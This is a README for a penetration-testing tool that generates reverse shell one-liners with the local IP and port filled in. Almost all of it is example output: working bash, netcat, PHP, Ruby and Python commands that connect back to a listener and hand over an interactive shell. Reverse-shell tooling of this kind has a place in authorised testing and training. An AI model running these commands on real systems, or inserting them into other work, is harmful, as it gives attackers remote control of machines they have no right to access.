# Reverse Shell Generator
Generates reverse shell commands and substitutes the IP address automatically. All commands are from [pentestmonkey](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet).

# Setup
Requires the [`netifaces`](https://github.com/al45tair/netifaces) package:
```
$ pip3 install -r requirements.txt
```

# Usage
```
$ python3 revsh.py [-h] [-p PORT] [-c CHOOSE [CHOOSE ...]] [iface]
```
By default, this script will automatically choose the first non-loopback network interface if no interface is specified. If an interface is specified, then the specified interface will be used. However, if the specified interface is invalid (invalid name or no IP assigned), then a valid interface will be chosen and used instead.

# Example
Auto choose an interface:
```
$ python3 revsh.py
bash -i >& /dev/tcp/192.168.1.3/9999 0>&1
bash -c 'bash -i >& /dev/tcp/192.168.1.3/9999 0>&1'
nc -e /bin/sh 192.168.1.3 9999
rm /tmp/ff;mkfifo /tmp/ff;cat /tmp/ff|/bin/sh -i 2>&1|nc 192.168.1.3 9999 >/tmp/ff
php -r '$sock=fsockopen("192.168.1.3",9999);exec("/bin/sh -i <&3 >&3 2>&3");'
ruby -rsocket -e'f=TCPSocket.open("192.168.1.3",9999).to_i;exec sprintf("/bin/sh -i <&%%d >&%%d 2>&%%d",f,f,f)'
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.1.3",9999));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

Use a custom port instead of 9999:
```
$ python3 revsh.py -p 1234
bash -i >& /dev/tcp/192.168.1.3/1234 0>&1
bash -c 'bash -i >& /dev/tcp/192.168.1.3/1234 0>&1'
nc -e /bin/sh 192.168.1.3 1234
rm /tmp/ff;mkfifo /tmp/ff;cat /tmp/ff|/bin/sh -i 2>&1|nc 192.168.1.3 1234 >/tmp/ff
php -r '$sock=fsockopen("192.168.1.3",1234);exec("/bin/sh -i <&3 >&3 2>&3");'
ruby -rsocket -e'f=TCPSocket.open("192.168.1.3",1234).to_i;exec sprintf("/bin/sh -i <&%%d >&%%d 2>&%%d",f,f,f)'
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.1.3",1234));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

Use a custom interface:
```
$ python3 revsh.py tun0
bash -i >& /dev/tcp/192.168.2.2/9999 0>&1
bash -c 'bash -i >& /dev/tcp/192.168.2.2/9999 0>&1'
nc -e /bin/sh 192.168.2.2 9999
rm /tmp/ff;mkfifo /tmp/ff;cat /tmp/ff|/bin/sh -i 2>&1|nc 192.168.2.2 9999 >/tmp/ff
php -r '$sock=fsockopen("192.168.2.2",9999);exec("/bin/sh -i <&3 >&3 2>&3");'
ruby -rsocket -e'f=TCPSocket.open("192.168.2.2",9999).to_i;exec sprintf("/bin/sh -i <&%%d >&%%d 2>&%%d",f,f,f)'
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.2.2",9999));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

Only output `bash` and `nc` commands (the valid commands are `bash`, `nc`, `php`, `ruby`, `python`):
```
$ python3 revsh.py -c bash nc
bash -i >& /dev/tcp/192.168.174.131/9999 0>&1
bash -c 'bash -i >& /dev/tcp/192.168.174.131/9999 0>&1'
nc -e /bin/sh 192.168.174.131 9999
rm /tmp/ff;mkfifo /tmp/ff;cat /tmp/ff|/bin/sh -i 2>&1|nc 192.168.174.131 9999 >/tmp/ff
```
